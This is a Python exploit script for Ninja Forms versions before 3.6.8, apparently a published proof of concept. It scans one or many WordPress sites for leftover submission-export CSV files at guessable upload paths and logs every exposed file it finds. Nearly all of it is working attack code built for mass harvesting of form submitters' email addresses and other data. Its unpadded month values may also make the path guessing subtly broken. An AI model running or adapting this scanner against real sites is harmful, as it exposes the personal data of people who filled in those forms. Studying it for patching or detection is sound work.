#!/usr/bin/env python
#
# 
#
# Ninja Forms < 3.6.8 - Unauthenticated Email Address Disclosure
#
#
# The plugin does not delete the temporary files created when exporting submissions, which could allow unauthenticated attackers to download them and get sensitive information such as the email address of users who submitted a form given that the file is publicly accessible, and with a guessable name
#
#
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
parser.add_argument("-i", "--formid", default="1",required=False, help="Form ID to Lookfor")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
urls = args.file
fid = args.formid


if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy
	
	


            
           

def check_for_csv(url,yr,mnt,fid):
	headers = {"Te":"trailers","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0","Connection":"close","Sec-Fetch-Dest":"document","Sec-Fetch-Site":"none","Sec-Fetch-User":"?1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"navigate"}
	response = session.get(""+url+"/wp-content/uploads/"+yr+"/"+mnt+"/form-"+fid+"-all-subs.csv", headers=headers,verify=False)
	if response.status_code == 200:
		if "Date Submitted" in response.text:
			print ("Found URL: "+response.url+"")
			text_file = open("found.txt", "a+")
			text_file.write(""+response.url+"\n")
			text_file.close()
	if response.status_code == 404:
		print("Not Found: "+response.url+"")
	


def start_it(url,fid):
	yr_all = ['2018','2019','2020','2021','2022','2023','2024']
	mnt_all = ['1','2','3','4','5','6','7','8','9','10','11','12']
	for yr in yr_all:
		for mnt in mnt_all:
			check_for_csv(url,yr,mnt,fid)
			
				



if urls:
	if os.path.exists(urls):
		with open(urls, 'r') as f:
			for line in f:
				url = line.replace("\n","")
				try:
					print("Testing "+url+"")
					start_it(url,fid)
				except KeyboardInterrupt:
					print ("Ctrl-c pressed ...")
					sys.exit(1)
				except Exception as e:
					print('Error: %s' % e)
					pass
		f.close()
	

else:
	start_it(url,fid)
